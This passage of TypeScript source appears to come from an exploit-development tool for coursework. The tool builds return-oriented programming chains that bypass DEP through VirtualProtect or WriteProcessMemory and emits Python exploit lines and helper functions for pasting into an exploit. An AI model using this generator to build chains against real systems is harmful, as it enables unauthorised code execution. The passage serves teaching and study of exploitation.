import { SCREEN } from "../core/screenshot_rule";
import { CapabilityIndex } from "../rop/capabilities";
import { rankCandidates } from "../rop/emitter";
import { RopGadget } from "../rop/types";
import { buildRopIndexFromRpPlusText } from "../rop";
import { MAX_HOPS, Path, ReachIndex, Reg, Unreached, Val, constVal, describe, effectOf, isPath } from "../rop/reach";
import { copyBytes, FRAMES, FrameFacts, frameGoal, PUSHAD_FRAMES, PUSHAD_TAIL, Slot, WPM_MIN_COPY } from "./dep_frames";
import { DepPlanStyle, JobPlan, LARGE_STACK_MOVE, Verdict, fieldRegister, gadgetAddress, hex32, holds, memoryWrites, movesEsp, sequence, sideEffects, stackMove, writtenRegisters } from "./dep_plan";
import { DepApi } from "./rop_template";

// One row per gadget the chain uses. Every block is a rendering of this table.
export type Entry = { name: string; address: number; sequence: string; pops: number; retn: number; job: string; loads: number };

/** A drop-in replacement for a chosen gadget: same job, same registers, no move needed. Its cost is in
 * COST too, so swapping is moving the comment marker and nothing else. */
export type Swap = { address: number; sequence: string; pops: number; retn: number; why: string };

/** A dword the chain sends after a gadget. `k` is its value when the tool knows it, and a known value is
 * checked against the bad chars when it is rendered. One only the script can compute, such as the size or
 * a patched distance, has none: the file's own `sendable` covers it, and every other byte it sends. */
type Dword = { text: string; k?: number };
const known = (k: number, text = hex32(k)): Dword => ({ text, k });
const computed = (text: string): Dword => ({ text });

// `note` is what the gadget leaves in the registers the load needs, printed after the call so each line
// can be checked against the debugger.
type Op = { call: Entry; values: Dword[]; times?: number; note?: string } | { line: string };

/** How many bytes past the saved EIP the crashing function's return moved ESP, and how that was seen.
 * `ret 4` makes it 4: the chain's second dword sits one dword further on. */
export type Landing = { gap: number; how: string };

/** Reads the gap at the crash: the dword EIP was popped from is still on the stack just below ESP, so its
 * distance from ESP is the gap. Undefined gap when the stack cannot show it, with the reason. */
export function measureLanding(eip: number | undefined, esp: number | undefined, read: (address: number) => number | undefined): Landing & { measured: boolean } {
  const assumed = (why: string): Landing & { measured: boolean } => ({ gap: 0, measured: false, how: `not measured, ${why}: assumed 0, a plain ret` });
  if (eip === undefined || esp === undefined) return assumed("no registers to read");
  const at = (offset: number): number | undefined => read((esp + offset) >>> 0);
  if (at(0) === eip) return assumed(`the dword at ESP is EIP ${hex32(eip)} too`);
  for (let below = 4; below <= 0x100; below += 4) {
    if (at(-below) !== eip) continue;
    if (at(-below - 4) === eip) return assumed(`EIP ${hex32(eip)} repeats below ESP`);
    const gap = below - 4;
    return { gap, measured: true, how: `EIP ${hex32(eip)} sits at ESP-${below.toString(16).toUpperCase()}, so the ret moved ESP ${gap} byte${gap === 1 ? "" : "s"} past it (dds esp-${below.toString(16)} L2)` };
  }
  return assumed(`EIP ${hex32(eip)} is not on the stack below ESP`);
}

/** A junk dword and the fill byte the payload pads with, both free of the bad chars. */
export function filler(bad: number[]): number {
  const byte = [...Array.from({ length: 26 }, (_, i) => 0x41 + i), ...Array.from({ length: 26 }, (_, i) => 0x61 + i)].find((b) => bad.indexOf(b) < 0) ?? 0x41;
  return (byte * 0x01010101) >>> 0;
}

export type BuildInput = {
  api: DepApi;
  style: DepPlanStyle;
  module: string;
  badchars: number[];
  index: CapabilityIndex | undefined;
  plans: JobPlan[];
  /** Gadget addresses the chain must not use, from the exclude argument. */
  exclude: number[];
  iatSlot?: number;
  slotWritable?: boolean;
  /** Set when no fixed module imports the API itself: the slot holds another export of the same DLL,
   * and the API is that pointer plus this distance. */
  delta?: Delta;
  writable?: number;
  cave?: number;
  /** How many bytes the cave holds, which is how many WriteProcessMemory may copy into it. */
  caveBytes?: number;
  /** The staged style only: writable module bytes the frame is laid in, 4 per slot, with every field
   * address free of the bad chars because the chain pops each one. Absent means the style is not
   * available and nothing chose it. */
  staging?: number;
  jmpEsp?: number;
  /** The next free payloadN() in the student's file. A block whose content is a sendable payload arrives
   * as that complete function, so his file grows by appending and every function is one thing he sends. */
  stage: number;
  /** Measured at the crash by measureLanding; absent means 0, the plain ret. */
  landing?: Landing;
};

/** The API reached from a neighbouring import of the same DLL, measured live: right for this build only. */
export type Delta = { dll: string; anchor: string; value: number };

// A section either has code to copy or a reason why it has none. There is no empty block.
export type Block = { lines: string[] } | { none: string };

/** `routes` is one line per register the loaders fill: the gadgets the search chose, in order, and why it
 * chose them. It is evidence, so it prints above the separator, and the code it describes is in [5/7]. */
export type Build = { table: Entry[]; blocks: Record<number, Block>; holes: string[]; stages: number[]; routes: string[] };

const JUNK = /^(junk|padding)/;
const REGISTERS = ["eax", "ecx", "edx", "ebx", "esi", "edi", "ebp"];
const hex = (value: number): string => hex32(value);
const isClean = (value: number, bad: number[]): boolean => [0, 8, 16, 24].every((shift) => bad.indexOf((value >>> shift) & 0xff) < 0);
const ident = (name: string): string => name.replace(/[^A-Za-z0-9]/g, "_").toLowerCase();
const far = (gadget: RopGadget): boolean => !movesEsp(gadget) && (stackMove(gadget) ?? 0) > LARGE_STACK_MOVE;
const ownsEsp = (operands: string[], mnemonic: string): boolean =>
  operands[0] === "esp" || mnemonic === "leave" || (mnemonic === "xchg" && operands.indexOf("esp") >= 0);

export function lastRetN(gadget: RopGadget): number {
  const last = gadget.instructions[gadget.instructions.length - 1];
  if (!last || last.mnemonic !== "ret" || last.operands.length !== 1) return 0;
  return parseInt(last.operands[0], last.operands[0].indexOf("0x") === 0 ? 16 : 10) || 0;
}

// Stack dwords the gadget takes beyond the values it is given, counted until it moves ESP. `loads` is
// 0 at every call site that records a cost, because a cost row is read by every call of that gadget and
// a count of leftovers is only right for the one call site it was measured at.
export function extraPops(gadget: RopGadget, loads: number): number {
  let pops = 0;
  for (const instruction of gadget.instructions) {
    const operands = instruction.operands.map((operand) => operand.trim().toLowerCase());
    if (instruction.mnemonic === "pop") pops += 1;
    else if (instruction.mnemonic === "push") pops -= 1;
    else if (instruction.mnemonic === "add" && operands[0] === "esp") pops += (parseInt(operands[1], 16) || 0) / 4;
    else if (ownsEsp(operands, instruction.mnemonic)) break;
  }
  return Math.max(0, pops - loads);
}

/** Pops after the gadget moved ESP: they eat dwords on the new stack, before its ret, so the register
 * the pivot takes ESP from has to point that many dwords below the frame's first field. */
export function popsAfterPivot(gadget: RopGadget): number {
  let moved = false;
  let pops = 0;
  for (const instruction of gadget.instructions) {
    const operands = instruction.operands.map((operand) => operand.trim().toLowerCase());
    if (!moved && ownsEsp(operands, instruction.mnemonic)) moved = true;
    else if (moved && instruction.mnemonic === "pop") pops += 1;
  }
  return pops;
}

// A gadget is named after the instruction that does the work, the first one. A push alone does nothing,
// so a gadget that starts with one takes the next instruction into its name too.
export function gadgetName(sequenceText: string): string {
  const parts = sequenceText.split(" ; ");
  // A push with a pop later is a move through the stack, and is named for the two ends of it.
  const pop = parts.findIndex((part, i) => i > 0 && part.indexOf("pop ") === 0);
  const used = parts[0].indexOf("push ") === 0 && pop > 0 ? [parts[0], parts[pop]]
    : parts[0].indexOf("push ") === 0 && parts.length > 1 ? parts.slice(0, 2) : parts.slice(0, 1);
  return used.join(" ")
    .replace(/\b(dword|word|byte)\b ?/g, "")
    .replace(/\[\s*(e[a-z]{2})[^\]]*\]/g, "mem $1")
    .replace(/0x/g, "")
    .replace(/[^a-z0-9]+/gi, "_")
    .replace(/^_|_$/g, "")
    .toUpperCase();
}

// Within a clash the lowest address keeps the plain name, so a name never changes between runs on one corpus.
function assignNames(table: Entry[]): void {
  const groups: Record<string, Entry[]> = {};
  for (const row of table) {
    const base = gadgetName(row.sequence);
    (groups[base] = groups[base] ?? []).push(row);
  }
  for (const base of Object.keys(groups)) {
    groups[base].sort((a, b) => a.address - b.address).forEach((row, i) => { row.name = i === 0 ? base : `${base}_${i + 1}`; });
  }
}

// [1/7] finds nothing that belongs in the exploit, so its block is the helpers every block below uses.
// p32 is one of them: pasted into an empty file, the blocks need only the two values his own work measured.
// It packs with int.to_bytes, so the block imports nothing and never doubles an import his file already has.
// Above it the evidence a screenshot keeps, below it the lines to paste.
export const COPY_SEPARATOR = "# ------------------ copy into your exploit ------------------";

/** `name = {entries}`, broken after a comma when it does not fit the screen. One gadget per job and a
 * swap or two each puts COST well past 130 columns on a real module, and Python takes a newline inside
 * braces, so the dict that carries every junk count is readable instead of running off the figure. */
function dictLines(name: string, entries: string[], width = SCREEN.columns): string[] {
  const indent = " ".repeat(name.length + 4);
  const lines: string[] = [];
  let line = `${name} = {`;
  entries.forEach((entry, i) => {
    const piece = i < entries.length - 1 ? `${entry},` : entry;
    if (line.length + piece.length + 1 <= width || line.indexOf("{") === line.length - 1) line += line.endsWith("{") ? piece : ` ${piece}`;
    else {
      lines.push(line);
      line = `${indent}${piece}`;
    }
  });
  return lines.concat(`${line}}`);
}

export const HELPER_BLOCK: Block = { lines: [
  "# needs OFFSET (from the crash) and BADCHARS (from the bad char hunt) already in this file",
  "def p32(v): return (v & 0xFFFFFFFF).to_bytes(4, \"little\")",
  "def neg(v): return (-v) & 0xFFFFFFFF",
  "def clean(v): return not any(b in BADCHARS for b in p32(v))",
  "def hole(name): raise SystemExit(\"still to fill: \" + name)",
  "def sendable(p):                  # every byte the payload carries, checked once before it is sent",
  "    bad = [i for i, b in enumerate(p) if b in BADCHARS]",
  "    if bad: raise SystemExit(\"bad char 0x%02X at payload offset %d: the target cuts the payload there\" % (p[bad[0]], bad[0]))",
  "    return p",
] };

export const CORPUS_BLOCK: Block = { none: "the corpus is the search, not the exploit. The gadgets the chain keeps get their names in [4/7]." };

// [2/7] prints before the chain is planned, so its block is built on its own and folded into the build.
export function slotBlock(api: DepApi, module: string, iatSlot: number | undefined, badchars: number[], delta?: Delta): { block: Block; hole?: string } {
  if (iatSlot === undefined) {
    const hole = `IAT_SLOT: no module with ASLR disabled imports ${api} or anything else from its DLL: the STOP says which layer failed`;
    return { block: { lines: [`# ${hole}`, "IAT_SLOT = hole(\"IAT_SLOT\")"] }, hole };
  }
  const note = isClean(iatSlot, badchars) ? "" : ". It holds a bad byte, so the chain builds it and never sends it";
  if (!delta) return { block: { lines: [`IAT_SLOT = ${hex(iatSlot)}     # ${api} in ${module}${note}`] } };
  return { block: { lines: [
    `IAT_SLOT = ${hex(iatSlot)}     # ${delta.dll}!${delta.anchor} in ${module}${note}`,
    `API_DELTA = ${hex(delta.value)}    # ${api} - ${delta.anchor}, measured on this machine. Any Windows update moves it: measure it again on the target`,
  ] } };
}

export function buildExploit(input: BuildInput): Build {
  const { api, style, index, badchars } = input;
  // Numbers handed out within this run, so two emitted functions can never collide with each other.
  const stages: number[] = [];
  const nextStage = (): number => {
    const number = input.stage + stages.length;
    stages.push(number);
    return number;
  };
  const gadgets = (index?.gadgets ?? []).filter((gadget) => input.exclude.indexOf(gadgetAddress(gadget)) < 0);
  const JUNK = filler(badchars);
  const gap = input.landing?.gap ?? 0;
  const retGap = `RET_GAP = ${gap}${" ".repeat(Math.max(1, 25 - String(gap).length))}# ${input.landing?.how ?? "not measured: assumed 0, a plain ret"}`;
  // STAGING plus an offset, as the chain's own text. The frame's base is a name the copy block defines,
  // so a reader sees which field each popped dword is instead of subtracting the write gadget's
  // displacement from a literal by hand.
  const stagingText = (offset: number): string =>
    offset === 0 ? "STAGING" : `STAGING ${offset < 0 ? "-" : "+"} 0x${Math.abs(offset).toString(16).toUpperCase()}`;
  const table: Entry[] = [];
  const holes: string[] = [];
  const byAddress: Record<number, RopGadget> = {};
  for (const gadget of gadgets) byAddress[gadgetAddress(gadget)] = gadget;
  const pick = (key: string): Verdict | undefined => input.plans.filter((plan) => plan.job.key === key)[0]?.pick;

  // Alternatives that swap in by moving the comment marker: same job, same registers, no move needed,
  // nothing the chain cannot point anywhere, and no frame-sized stack move that would silently grow the
  // payload. A candidate rejected for clobbering a live register is not a fallback, it is a trap, so it
  // never appears here.
  const swapsFor = (address: number, loads: number): Swap[] => {
    // A gadget the loader search chose has its twins from the search; one from a job pick has them from
    // that job's ranking. Both are drop-ins for the same reason, so they render as one list.
    const fromSearch = (searchSwaps[address] ?? []).filter((swap, i, all) => all.findIndex((other) => other.address === swap.address) === i).slice(0, 2);
    const plan = input.plans.filter((candidate) => candidate.pick && gadgetAddress(candidate.pick.gadget) === address)[0];
    if (!plan || !plan.pick) return fromSearch;
    const chosen = plan.pick;
    // Drop-in means the chain's arithmetic does not move: the same operands, the same offset, and
    // nothing running before the instruction that does the job. `mov [ecx+0x8]` is not a swap for
    // `mov [ecx+0x20]`, it is a different chain.
    const sameAt = (verdict: Verdict): boolean =>
      verdict.at.dest === chosen.at.dest && verdict.at.source === chosen.at.source
      && verdict.at.address === chosen.at.address && (verdict.at.offset ?? 0) === (chosen.at.offset ?? 0);
    return plan.verdicts
      .slice(plan.verdicts.indexOf(chosen) + 1)
      .filter((verdict) => verdict.usable && !verdict.move && verdict.uncontrolled.length === 0 && !verdict.far
        && verdict.leads && chosen.leads && sameAt(verdict)
        && input.exclude.indexOf(gadgetAddress(verdict.gadget)) < 0)
      .slice(0, 2)
      .map((verdict) => ({
        address: gadgetAddress(verdict.gadget),
        sequence: sequence(verdict.gadget),
        pops: extraPops(verdict.gadget, 0),
        retn: lastRetN(verdict.gadget),
        why: sideEffects(verdict.gadget, plan.job),
      }))
      .concat(fromSearch)
      .filter((swap, i, all) => all.findIndex((other) => other.address === swap.address) === i && swap.address !== address)
      .slice(0, 2);
  };

  // Carried into the emitted comment, not only into the evidence: the comment is what survives into his file.
  const warnings: Record<number, string> = {};
  for (const plan of input.plans) {
    if (plan.pick && plan.pick.uncontrolled.length > 0) {
      warnings[gadgetAddress(plan.pick.gadget)] = `reads through ${plan.pick.uncontrolled.join(", ")}, which nothing points anywhere: set ${plan.pick.uncontrolled.join(" and ")} first or it faults here`;
    }
  }

  const row = (address: number, text: string, job: string, pops = 0, retn = 0, loads = 0): Entry => {
    const found = table.filter((entry) => entry.address === address)[0];
    if (found) return found;
    const entry: Entry = { name: "", address, sequence: text, pops, retn, job, loads };
    table.push(entry);
    return entry;
  };
  const entry = (gadget: RopGadget, job: string, loads = 0): Entry =>
    row(gadgetAddress(gadget), sequence(gadget), job, extraPops(gadget, 0), lastRetN(gadget), loads);

  // Names exist only once the table is complete, so ops hold entries and lines hold tokens.
  const refs: Entry[] = [];
  const ref = (target: Entry): string => `\u0001${refs.push(target) - 1}\u0001`;

  // A value no static analysis can give: the comment carries the command that produces it, and hole()
  // stops the script instead of letting a plausible-looking wrong value reach the target. A reason given
  // in several sentences becomes a comment per line, so a long one reads as a block instead of running
  // off the screen; the verdict still gets it as one line.
  const hole = (target: string, how: string): Op[] => {
    const [first, ...rest] = how.split("\n");
    // The verdict counts holes and names each one, so it takes the first sentence. The rest is the detail
    // behind that sentence and belongs beside the hole() line, once, where the reader is already looking.
    holes.push(`${target}: ${first}`);
    return [
      { line: `# ${target}: ${first}` },
      ...rest.map((line) => ({ line: `#   ${line}` })),
      { line: `${target} = hole(${JSON.stringify(target)})` },
    ];
  };

  // Opens a group of chain lines. Every c.rop in the chain sits under one, so the lines that built a field
  // are found by scrolling to its header instead of counting dwords.
  const group = (title: string): Op => ({ line: `#-- ${title}` });

  const usable = (gadget: RopGadget, keep: string[], own: string[]): boolean =>
    !movesEsp(gadget)
    && memoryWrites(gadget, "").length === 0
    && writtenRegisters(gadget).every((register) => own.indexOf(register) >= 0 || keep.indexOf(register) < 0);

  // The ranking puts fewer side effects before a smaller stack move, so a frame-sized move can still rank
  // first; it only wins when nothing else does the job.
  const near = (ranked: RopGadget[]): RopGadget[] => [...ranked.filter((gadget) => !far(gadget)), ...ranked.filter(far)];

  const popGadget = (register: string, keep: string[]): RopGadget | undefined => near(rankCandidates(gadgets.filter((gadget) => {
    const first = gadget.instructions[0];
    return first?.mnemonic === "pop" && first.operands[0]?.trim().toLowerCase() === register && usable(gadget, keep, [register]);
  })))[0];

  const moveGadget = (from: string, to: string, keep: string[]): RopGadget | undefined => near(rankCandidates(gadgets.filter((gadget) =>
    gadget.capabilities.some((capability) =>
      (capability.kind === "MOVE_REGISTER" && capability.register === to && capability.targetRegister === from)
      || (capability.kind === "EXCHANGE_REGISTER" && [capability.register, capability.targetRegister].sort().join() === [from, to].sort().join()))
    && holds(gadget, to, from) && usable(gadget, keep, keep.indexOf(from) >= 0 ? [to] : [to, from]))))[0];

  // A move through at most one other register, so a value reaches the register a gadget reads.
  const moveOps = (from: string, to: string, keep: string[]): Op[] | undefined => {
    if (from === to) return [];
    const direct = moveGadget(from, to, keep);
    if (direct) return [{ call: entry(direct, `move ${from} into ${to}`), values: [] }];
    for (const via of REGISTERS) {
      if (via === from || via === to || keep.indexOf(via) >= 0) continue;
      const first = moveGadget(from, via, keep);
      const second = first ? moveGadget(via, to, keep) : undefined;
      if (first && second) return [{ call: entry(first, `move ${from} into ${via}`), values: [] }, { call: entry(second, `move ${via} into ${to}`), values: [] }];
    }
    // No mov or xchg does it: what each gadget does to the registers, so a push and a pop is a move too.
    const path = REGISTERS.indexOf(from) >= 0 && REGISTERS.indexOf(to) >= 0 ? reachIndex.copy(from as Reg, to as Reg, keep) : undefined;
    if (!path || path.some((effect) => movesEsp(effect.gadget))) return undefined;
    return path.map((effect) => ({ call: entry(effect.gadget, `move ${from} into ${to}`), values: [] }));
  };

  // Commands in the emitted comments take the bad chars written out, the way the user passed them. A
  // `<bad chars>` placeholder in a command the run could fill is the automatic rule failing.
  const badSpaced = badchars.map((b) => b.toString(16).padStart(2, "0").toUpperCase()).join(" ");

  // One search per load. The scratch dword lets a value go through memory when no register route exists.
  const reachIndex = new ReachIndex(gadgets);
  const slotWritable = input.slotWritable && input.iatSlot !== undefined ? [input.iatSlot] : [];
  const scratch = input.writable !== undefined && isClean(input.writable, badchars) ? { at: input.writable, text: "WRITABLE" } : undefined;

  // The gadget shapes the unreachable sentence tries, one at a time, to name the single one that would
  // have opened a path. Each is checked by rerunning the search with it added, never assumed.
  const unlockShapes = (register: string): string[] => [
    `pop ${register}`, `mov ${register}, dword [${register}]`,
    ...REGISTERS.filter((other) => other !== register).map((other) => `mov ${register}, ${other}`),
    ...REGISTERS.filter((other) => other !== register).map((other) => `xchg ${register}, ${other}`),
    ...REGISTERS.filter((other) => other !== register).map((other) => `add ${register}, ${other}`),
    `neg ${register}`,
  ];
  const unlock = (register: string, goal: Val, keep: string[]): { shape: string; route: string; hops: number } | undefined => {
    const shapes = unlockShapes(register);
    const synthetic = buildRopIndexFromRpPlusText(shapes.map((shape, i) => `0x${(0x7f000010 + i * 0x10).toString(16)}: ${shape} ; ret ;  (1 found)`).join("\n")).gadgets;
    let found: { shape: string; route: string; hops: number } | undefined;
    for (const gadget of synthetic) {
      const effect = effectOf(gadget);
      if (!effect) continue;
      const result = reachIndex.plus([effect]).reach(register as Reg, goal, { bad: badchars, keep, scratch, maxNodes: 4000 });
      if (isPath(result) && (!found || result.hops.length < found.hops)) {
        found = { shape: sequence(gadget), route: result.hops.map((hop) => hop.kind).join(", "), hops: result.hops.length };
      }
    }
    return found;
  };

  // What the search covered, in the terms of the thing it searched: how many distinct effects on the
  // register the module gave it, how deep it looked, and whether it ran out of module or of budget. Three
  // lengths, because the same sentence has to sit in three places and only one of them has room: `full`
  // beside the hole() line, which is its one home, `short` in the route list, and `brief` in [7/7].
  const unreachable = (register: string, goal: Val, keep: string[], name: string, result: Unreached): Written => {
    const kept = keep.length > 0 ? ` that ${result.providers === 1 ? "keeps" : "keep"} ${keep.join(", ")}` : ", with nothing to keep";
    const pool = `${result.providers} distinct way${result.providers === 1 ? "" : "s"} to write ${register}`;
    const searched = result.exhausted
      ? `searched: ${input.module} gives ${pool}${kept}. No combination of up to ${result.maxHops} of them reaches it.`
      : `searched: ${input.module} gives ${pool}${kept}. The search gave up after ${result.searched} states, short of ${result.maxHops} gadgets.`;
    const key = unlock(register, goal, keep);
    const fix = key
      ? `one gadget would unlock it: ${key.shape}, which the search then finishes in ${key.hops} gadget${key.hops === 1 ? "" : "s"} (${key.route}).\nconfirm it is really absent before changing module: dx @$osed().palette("${input.module}", "${badSpaced}")`
      : `no single pop, mov, xchg, deref, add or neg of ${register} would unlock it either, so the value is out of reach in this module whatever gadget turned up.`;
    // The route line names the width of the search and the missing piece; the sentence that spells out
    // what each means is the hole below it, so this one points there instead of repeating it.
    const narrow = `the ${result.providers} way${result.providers === 1 ? "" : "s"} ${input.module} writes ${register}${keep.length > 0 ? ` while keeping ${keep.join(", ")}` : ""}`;
    return {
      brief: `no route, so load_${ident(name)} below is a hole`,
      short: `no route among ${narrow}. ${key ? `${key.shape} would unlock it` : "No pop, mov, xchg, deref, add or neg of it would either"}; load_${ident(name)} below says what was searched.`,
      full: `${register} = ${name} (${describe(goal)}) cannot be reached.\n${searched}\n${fix}`,
    };
  };

  // A hop's lower-ranked twins. They do the same thing to the same register, so swapping one in is moving
  // the comment marker, and their cost rows are emitted with the chosen one's.
  const searchSwaps: Record<number, Swap[]> = {};

  /** One line per loader: the route and why it won, for the evidence above the [5/7] separator. */
  const routes: string[] = [];
  /** The same decision at a width [7/7] can carry, keyed by the loader it belongs to. */
  const briefs: Record<string, string> = {};
  const said: string[] = [];
  // Every loader gets a line in both places, so counting them against the [6/7] register map comes out
  // even and no register is left looking unsearched when it was, or searched when it was not.
  const say = (register: string, name: string, value: string, long: string, brief: string): void => {
    routes.push(`${register} = ${name} (${value}): ${long}`);
    briefs[`load_${ident(name)}`] = `${register} = ${name}: ${brief}`;
    said.push(`load_${ident(name)}`);
  };

  // The same question is asked more than once: the pushad order is tried before any loader is written,
  // and then every loader asks again. A search over a real module's corpus costs tens of milliseconds, so
  // on WinDbg's engine the repeats are the difference between a pause and a wait. The answer depends only
  // on the register, the value and its text, and what must be kept; the bad chars and the scratch dword
  // are fixed for the whole build.
  const answers: Record<string, Path | Unreached> = {};
  const reachPath = (register: string, goal: Val, keep: string[]): Path | Unreached => {
    const key = `${register}|${goal.mem?.at ?? ""}|${goal.k}|${goal.text}|${keep.slice().sort().join(",")}`;
    if (!answers[key]) answers[key] = reachIndex.reach(register as Reg, goal, { bad: badchars, keep, scratch, writable: slotWritable });
    return answers[key];
  };

  /** One decision at three widths: [7/7] has a comment's worth, the route list a line, the hole a block. */
  type Written = { brief: string; short: string; full: string };

  // A path the search found, as chain lines the reader can check gadget by gadget.
  const walk = (register: string, goal: Val, name: string, result: Path): { ops: Op[]; names: string[] } => {
    const ops: Op[] = [];
    const kinds = result.hops.map((hop) => hop.kind).join(", ");
    if (result.hops.length > 1) {
      const why = goal.mem ? "read at run time" : isClean(goal.k, badchars) ? "built" : "has bad bytes, so built";
      ops.push({ line: `# ${register} = ${describe(goal)}, ${why}: ${kinds}` });
    }
    const names: string[] = [];
    for (const hop of result.hops) {
      const values = hop.values.map((value) => (value ? known(value.value, value.text) : known(JUNK, "JUNK")));
      const row = entry(hop.gadget, `${register} = ${name}`, values.length);
      names.push(ref(row));
      searchSwaps[row.address] = (searchSwaps[row.address] ?? []).concat(hop.alts
        .filter((alt) => input.exclude.indexOf(gadgetAddress(alt.gadget)) < 0)
        .map((alt) => ({
          address: gadgetAddress(alt.gadget), sequence: sequence(alt.gadget),
          pops: extraPops(alt.gadget, 0), retn: lastRetN(alt.gadget), why: alt.why,
        })));
      ops.push({ call: row, values, note: hop.notes.join("; ") });
    }
    return { ops, names };
  };

  // register += delta, for a distance the chain knows when it is written. The value goes into another
  // register by the search, not by a lone pop, so a distance holding a bad byte is built the way the
  // register values are: -20 is 0xFFFFFFEC for an add and 0x00000014 for a sub, and only one may be clean.
  // `prefer` is a job's pick, tried first so the chain keeps the gadget [4/7] shows.
  const offsetBy = (register: string, delta: number, keep: string[], what: string, prefer?: RopGadget): Op[] | { missing: string } => {
    if (delta === 0) return [];
    const kept = keep.concat(register);
    const options = gadgets.filter((gadget) => gadget.capabilities.some((capability) =>
      (capability.kind === "REGISTER_ADD" || capability.kind === "REGISTER_SUB") && capability.register === register
      && REGISTERS.indexOf(capability.targetRegister ?? "") >= 0 && capability.targetRegister !== register
      && keep.indexOf(capability.targetRegister ?? "") < 0)
      && usable(gadget, keep, [register]));
    const ordered = [...(prefer && options.indexOf(prefer) >= 0 ? [prefer] : []), ...near(rankCandidates(options)).filter((gadget) => gadget !== prefer)];
    let best: { gadget: RopGadget; by: string; goal: Val; path: Path; sub: boolean } | undefined;
    for (const gadget of ordered) {
      const capability = gadget.capabilities.filter((cap) => (cap.kind === "REGISTER_ADD" || cap.kind === "REGISTER_SUB") && cap.register === register)[0];
      const sub = capability.kind === "REGISTER_SUB";
      const by = capability.targetRegister ?? "";
      const goal = constVal(sub ? -delta : delta);
      const path = reachPath(by, goal, kept);
      if (isPath(path) && (!best || path.hops.length < best.path.hops.length)) best = { gadget, by, goal, path, sub };
      if (best && gadget === prefer) break;
    }
    if (!best) {
      return { missing: `no add or sub of a register into ${register} whose distance the search can load: ${register} ${delta < 0 ? "-" : "+"} ${hex(Math.abs(delta))} for ${what}` };
    }
    return [
      { line: `# ${register} ${delta < 0 ? "-" : "+"}= ${hex(Math.abs(delta))} for ${what}: ${best.by} = ${describe(best.goal)}, then ${best.sub ? "sub" : "add"}` },
      ...walk(best.by, best.goal, what, best.path).ops,
      { call: entry(best.gadget, best.sub ? "subtract a distance" : "add a distance"), values: [] },
    ];
  };

  // register = goal without writing `keep`, as a route the reader can check gadget by gadget.
  const reachOps =(register: string, goal: Val, keep: string[], name: string): Op[] | { missing: string } => {
    const result = reachPath(register, goal, keep);
    if (!isPath(result)) {
      const why = unreachable(register, goal, keep, name, result);
      say(register, name, describe(goal), why.short, why.brief);
      return { missing: why.full };
    }
    const { ops, names } = walk(register, goal, name, result);
    // Why this route and not a shorter one. A value the chain cannot send as a dword is the reason no
    // single pop does it, and naming that reason is what makes the extra gadgets defensible; the rest the
    // search settled by cost over every state it expanded.
    const dirty = badchars.filter((b) => [0, 8, 16, 24].some((s) => ((goal.k >>> s) & 0xff) === b))
      .map((b) => b.toString(16).padStart(2, "0")).join(" ");
    const why = result.hops.length === 1 ? `a direct ${result.hops[0].kind}`
      : goal.mem ? `${result.hops.length} gadgets: the value is the dword at ${goal.mem.text}, known only at run time`
        : !isClean(goal.k, badchars) ? `${result.hops.length} gadgets: no pop can send ${hex(goal.k)}, which holds ${dirty}`
          : `${result.hops.length} gadgets, cheapest of ${result.searched} state${result.searched === 1 ? "" : "s"}`;
    say(register, name, describe(goal), `${names.join(" -> ")}. ${why}`, `${names.join(" -> ")}`);
    return ops;
  };
  const lone = (): RopGadget | undefined => rankCandidates(gadgets.filter((gadget) => gadget.instructions.length === 1 && gadget.instructions[0].mnemonic === "ret" && gadget.instructions[0].operands.length === 0))[0];
  const skipper = (): RopGadget | undefined => rankCandidates(gadgets.filter((gadget) => !movesEsp(gadget) && extraPops(gadget, 0) === 3 && lastRetN(gadget) === 0 && memoryWrites(gadget, "").length === 0))[0];
  // What the search must leave in the register for a slot, without adding anything to the table: the
  // pushad order is tried with this before a single loader is written.
  // The three slots whose value is an address in the corpus rather than a fact about the target. Every
  // other slot's goal comes from `frameGoal`, the same function the method layer weighs a write gadget
  // with, so the value a loader searches for and the value the choice of register was made against
  // cannot differ.
  const facts: FrameFacts = { iatSlot: input.iatSlot, slotWritable: input.slotWritable, delta: input.delta?.value, writable: input.writable, cave: input.cave, caveBytes: input.caveBytes };
  const goalOf = (slot: Slot): Val | undefined => {
    switch (slot.source.kind) {
      case "ropnop": { const ret = lone(); return ret ? constVal(gadgetAddress(ret), "RET") : undefined; }
      case "jmpesp": return input.jmpEsp === undefined ? undefined : constVal(input.jmpEsp, "JMP_ESP");
      case "skip3": { const skip = skipper(); return skip ? constVal(gadgetAddress(skip), "SKIP3") : undefined; }
      default: return frameGoal(slot, facts);
    }
  };

  const capture = pick("capture");
  const add = pick("add");
  const copy = pick("copy");
  const copyPath = input.plans.filter((plan) => plan.job.key === "copy")[0]?.path;
  const read = pick("read");
  const write = pick("write");
  const advance = pick("advance");
  const negate = pick("negate");
  const pivot = pick("pivot");
  const field = fieldRegister(input.plans) ?? "";
  const valueRegister = write?.at.source ?? "eax";
  const writeOffset = write?.at.offset ?? 0;

  // register += a distance popped into another register that `keep` does not need.
  const arithmetic = (register: string, keep: string[]): { pop: Entry; op: Entry; by: string; sub: boolean } | undefined => {
    for (const kind of ["REGISTER_SUB", "REGISTER_ADD"]) {
      const options = near(rankCandidates(gadgets.filter((gadget) => gadget.capabilities.some((capability) =>
        capability.kind === kind && capability.register === register && REGISTERS.indexOf(capability.targetRegister ?? "") >= 0
        && capability.targetRegister !== register && keep.indexOf(capability.targetRegister ?? "") < 0)
        && usable(gadget, keep, [register]))));
      for (const gadget of options) {
        const by = gadget.capabilities.filter((capability) => capability.kind === kind && capability.register === register)[0].targetRegister ?? "";
        const pop = popGadget(by, keep.concat(register));
        if (pop) return { pop: entry(pop, `load ${by}`, 1), op: entry(gadget, kind === "REGISTER_SUB" ? "subtract a distance" : "add a distance"), by, sub: kind === "REGISTER_SUB" };
      }
    }
    return undefined;
  };

  // A negate of one register whose instruction is the gadget's first, so it negates the value it was
  // handed rather than something an instruction before it left there.
  const negateGadget = (register: string, keep: string[]): RopGadget | undefined =>
    near(rankCandidates(gadgets.filter((gadget) => {
      const capability = gadget.capabilities.filter((cap) => cap.kind === "REGISTER_NEGATE" && cap.register === register)[0];
      return capability !== undefined && capability.evidence[0] === gadget.instructions[0]?.normalizedText
        && usable(gadget, keep, [register]);
    })))[0];

  /** `register += the distance to the shellcode`, where the script chooses the dword once the chain is
   * laid out. The sled is a few hundred bytes up the stack, so the distance itself is 0x000001xx and a
   * target with 00 among its bad chars cannot send it; what it can send is neg(distance), 0xFFFFFExx. A
   * sub consumes that one as it is, and an add consumes it after a negate of the same register, so the
   * sign the script sends is this choice and `negated` is what [7/7]'s to_sled then returns. */
